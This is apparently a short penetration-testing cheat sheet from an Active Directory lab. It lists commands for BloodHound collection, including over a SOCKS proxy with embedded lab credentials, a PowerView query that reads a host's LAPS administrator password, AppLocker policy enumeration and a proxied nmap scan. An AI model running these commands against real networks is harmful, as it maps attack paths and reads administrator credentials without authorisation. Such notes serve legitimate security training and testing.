Sharphound:
```
Invoke-BloodHound -CollectionMethods All -ZipFilename ofir -ZipPassword Aa123456 -OutputDirectory C:\Users\Public\
# Or with SOCKS:
proxychains -q python bloodhound.py -dc DC04.lab.local -ns 172.16.184.150 -u will -p '123456' -d lab.local -c all --dns-tcp
```

PowerView:
```
# Get LAPS password
Get-DomainObject -Identity WEB05 -Properties ms-Mcs-AdmPwd
```

Applocker:
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

NMAP with SOCKS5:
```
proxychains nmap -sT -PN -n -sV 172.16.176.180 -p 445
```
